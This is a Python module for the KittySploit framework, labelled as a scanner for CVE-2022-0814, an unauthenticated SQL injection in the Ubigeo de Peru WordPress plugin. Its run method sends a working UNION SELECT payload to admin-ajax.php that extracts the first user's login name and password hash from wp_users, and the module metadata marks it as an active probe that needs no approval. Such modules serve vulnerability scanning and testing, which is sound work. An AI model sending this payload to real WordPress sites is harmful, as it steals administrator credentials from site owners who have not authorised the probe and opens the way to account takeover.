#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not properly sanitise and escape some parameters before using them in SQL statements via vario."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ubigeo de Peru < 3.6.4 - SQL Injection Detection',
        'description': 'The plugin does not properly sanitise and escape some parameters before using them in SQL statements via various AJAX actions, some of which are available to unauthenticated users, leading to SQL Injections.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'wordpress',
            'wpscan',
            'wp-plugin',
            'sqli',
            'ubigeo-peru',
            'unauth',
            'ubigeo_de_peru_para_woocommerce_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/fd84dc08-0079-4fcf-81c3-a61d652e3269',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0814',
            'https://wordpress.org/plugins/ubigeo-peru/',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-0814',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=rt_ubigeo_load_distritos_address&idProv=1%20UNION%20SELECT%201,(SELECT%20user_login%20FROM%20wp_users%20WHERE%20ID%20=%201),(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID%20=%201)%20from%20wp_users#\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('idProv', 'idDist', 'distrito',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Ubigeo de Peru < 3.6.4 - SQL Injection detected', path=path)
            return True
        return False

